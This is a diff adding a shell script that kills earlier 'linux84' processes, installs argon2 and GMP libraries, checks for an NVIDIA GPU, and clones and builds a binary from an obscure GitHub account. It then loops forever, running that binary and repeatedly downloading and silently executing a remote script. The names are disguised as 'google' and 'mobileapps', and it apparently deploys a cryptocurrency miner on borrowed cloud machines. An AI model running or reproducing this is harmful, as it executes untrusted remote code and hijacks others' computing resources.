@@ -1,0 +1,78 @@
+pkill -f linux84
+pkill -f linux84
+pkill -f linux84
+pkill -f linux84
+pkill -f linux84
+pkill -f linux84
+pkill -f linux84
+pkill -f linux84
+
+wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/resolv.conf
+
+rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+
+mkdir /mnt/disks/
+
+mkdir /mnt/disks/user/
+
+mkdir /mnt/disks/user/project/
+
+cd /mnt/disks/user/project/
+
+apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
+
+rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+
+rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+
+rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+
+rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+
+rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+
+rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+
+google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
+
+if [[ $google84121274 == *"failed"* ]]; then
+
+git clone https://github.com/mobileapps84741274/linuxcpu84
+cd linuxcpu84
+mkdir build
+cd build
+cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_CUDA:BOOL="0"
+make
+
+while true
+do
+
+wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgoogle84741274
+
+bash ./linuxgoogle84741274 &> /dev/null &
+
+./linux84 8
+
+done
+
+else
+
+git clone https://github.com/mobileapps84741274/linuxgoogle1
+cd linuxgoogle1
+mkdir build
+cd build
+cmake .. -DCMAKE_BUILD_TYPE=Release
+make
+
+while true
+do
+
+wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgoogle84741274
+
+bash ./linuxgoogle84741274 &> /dev/null &
+
+./linux84 8
+
+done
+
+fi
